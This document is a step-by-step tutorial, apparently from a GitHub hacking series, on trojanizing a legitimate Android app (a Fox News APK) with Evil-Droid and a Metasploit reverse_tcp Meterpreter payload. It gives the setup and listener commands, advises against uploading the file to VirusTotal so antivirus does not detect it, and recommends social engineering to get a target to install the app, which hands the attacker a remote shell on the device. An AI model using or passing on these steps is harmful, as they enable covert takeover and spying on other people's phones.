### **Android Hacking: How to Embed a Backdoor into an Android APK**

Mobile devices--smartphones and tablets--are proliferating around the world and slowly overtaking desktop and laptop machines. These mobile devices generally run either the iOS or the Android operating system, with Android comprising the bulk of all mobile device OS's (82%). Considering the growth of the mobile market and the dominance of the Android operating system, it only makes sense that Android hacking is increasingly becoming the leading edge of hacking. As such, we will spend increasing time and tutorials on Android hacking here at GitHub to prepare you for this eventuality.

 https://github.com/Hsnbacha/Android-Hacking/blob/main/Images/Image1.png


This is the third entry in Android Hacking series with Setting up a Android Hacking Lab and Android Basics preceding it. I strongly recommend that you look over Android Basics article before proceeding further into this series.

 

### **Step #1 Download and Install Evil Droid**

 

To embed a backdoor into an Android APK, we will be using Evil-Droid. It's a python script developed by Mascerano Bachir that generates a framework for creating and embedding an APK payload to penetrate Android platforms. 

To download the script, you can clone it into your system by entering;

`kali > git clone https://github.com/M4sc3r4n0/Evil-Droid`

 

(https://github.com/Hsnbacha/Android-Hacking/blob/main/Images/Image2.png)

 
If you get an error message indicating that some of Evil-Droid's dependencies are not available or out-of-date, you may need to upgrade to newer versions of your packages.

` 
kali > apt-get upgrade`

### **Step #2 Give Yourself Execute Permissions**

 

The next step, of course, is to give yourself permission to execute this script. First, navigate to the Evil-Droid directory and then use **chmod** to give yourself execute permission.

` 
kali > cd Evil-Droid`

` 
kali > chmod 775 evil-droid`

 Image 3


###  
**Step #3 Execute Evil Droid**

 

Next, let's execute evil-droid. Evil-droid will check to see whether you have an Internet connection and several pieces of necessary software, including Metasploit.

`kali > ./evil-droid`

 

Image 4

 

_Note_ the bottom warning in RED. Do **NOT** upload the APK to VirusTotal.com as that will trigger an antivirus signature by the AV developers.

### **Step #4 Execute the  Framework**

 

Once evil-droid has successfully located all it's necessary components, you will receive a message like that below asking whether you want to "Execute Framework and services". Click "**Yes**".

 


Image 5
 



### **Step #5 Select Backdoor**

 

You will be greeted by the menu  screen below. You can select any of the backdoors by number. Here we selected "Backdoor APK Original (NEW)".

 

Image 6




### **Step #6 Select IP and Port**

 

Evil-droid will then ask you to set your LHOST (for Metasploit) and display your local IP and Public IP.

 

Image 7

 Then, it will prompt you for your LPORT. Port 4444 is the default port for Metasploit's Meterpreter and other payloads.

 Image 8

 

### **Step #7 Name your Payload**

 

Evil-droid will then ask you to name your payload. Here I named it **GitHUB**, but you can name it whatever pleases you.
 

### **Step #8 Select Your Payload/Listener**

 

Now, we need to select a payload. Evil-droid enables you to use any of the Android payloads from Metasploit including **android/meterpreter/reverse_tcp**. Simply click on the radio button next to the payload you want to embed in the APK.

Image 9



### **Step #9 Download APK and Embed Backdoor**

 

Next, evil-droid prompts us for the APK file we want to embed the backdoor into. Here, I have downloaded the beloved **Foxnews.apk** for embedding our backdoor.

Image 10
 
 

### **Step #10 Select Metasploit Multi-Handler to make a Connection**

In our next step, we need to  tell evil-droid how we are going to connect to the backdoor. Select "Multi-Handler".

 Image 11


We now need to open the multi-handler in Metasploit so that it can "catch" the connection coming back from the embedded payload. 

 
Open Metasploit by entering;

`kali > msfconsole`

Now we need to start the multi-handler and tell Metasploit what IP and port to listen on and which payload to listen for.

`msf > use exploit/multi/handler`

`msf > set PAYLOAD android/meterpreter/reverse_tcp`

`msf > SET LHOST 192.168.1.104`

`msf > set LPORT 4444`

 

Image 12

 

### **Step #11 Deliver the APK to the Target**

 

In this final step, we need to have the APK (with the embedded backdoor) to be installed and executed on the target's Android device. This is where some social engineering skills can prove helpful. You can email the APK or send it via **DropBox** or other file sharing system. If you have physical access to the device, you could simply install it yourself.


Image 13
 
When the target user installs the app to view their "**Fair and Balanced**" FoxNews, it will execute the backdoor and connect back to your system giving you  a meterpreter shell on their android device!
